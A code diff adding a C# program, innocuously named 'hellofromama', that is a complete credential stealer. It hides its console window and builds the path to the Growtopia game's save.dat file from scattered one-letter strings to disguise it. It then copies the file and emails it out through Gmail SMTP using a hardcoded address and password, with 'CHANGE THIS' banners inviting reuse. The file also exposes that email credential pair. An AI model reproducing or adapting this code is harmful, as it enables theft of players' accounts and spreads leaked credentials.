@@ -1,0 +1,95 @@
+using System;
+using System.Net;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
+
+namespace hellofromama
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("Kernel32")]
+        private static extern IntPtr GetConsoleWindow();
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        static void Main(string[] args)
+        {
+            IntPtr hwnd;
+            hwnd = GetConsoleWindow();
+            ShowWindow(hwnd, SW_HIDE);
+            string df = "a";
+            string dc = "w";
+            string gx = "g";
+            string az = "s";
+            string cv = "t";
+            string fs = "e";
+            string fd = "o";
+            string ks = "i";
+            string za = "d";
+            string kk = ".";
+            string ax = "r";
+            string gh = "v";
+            string gz = "a";
+            string xd = "p";
+            int ka = 587;
+            string sarr = "\\" + gx + ax + fd + dc + cv + fd + xd + ks + df + "\\";
+            string kek = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string root = kek + sarr;
+            string des = System.IO.Path.GetTempPath();
+            string p1;
+            string p2;
+            string p3;
+            string sor = az + gz + gh + fs + kk + za + df + cv;
+            string desn = "z1.txt";
+            string sors = System.IO.Path.Combine(root, sor);
+            p1 = "smtp.";
+            string dz = System.IO.Path.Combine(des, desn);
+            if (!System.IO.Directory.Exists(des))
+            {
+                System.IO.Directory.CreateDirectory(des);
+            }
+            System.IO.File.Copy(sors, dz, true);
+            string fr;
+            p2 = "gmail";
+            string to;
+            string sub;
+            string boy;
+            string us;
+            p3 = ".com";
+            string pa;
+            string sad;
+
+//CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS 
+            us = "datesave1@gmail.com";  //CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS 
+            pa = "nomanyla"; //CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS 
+//CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS CHANGE THIS 
+
+            to = us;
+            fr = us;
+            string ksa;
+            string lsa = p1 + p2 + p3;
+            sub = "test for you";
+            boy = "hello world ";
+            ksa = dz;
+            sad = kek + sarr;
+            MailMessage message = new MailMessage(fr, to, sub, boy);
+            SmtpClient smtp = new SmtpClient(lsa, ka);
+            smtp.EnableSsl = true;
+            smtp.Credentials = new NetworkCredential(us, pa);
+            if (dz != string.Empty || dz != null)
+            {
+                Attachment attach = new Attachment(ksa);
+                message.Attachments.Add(attach);
+            }
+            smtp.Send(message);
+            return;
+            
+        }
+
+
+    }
+}
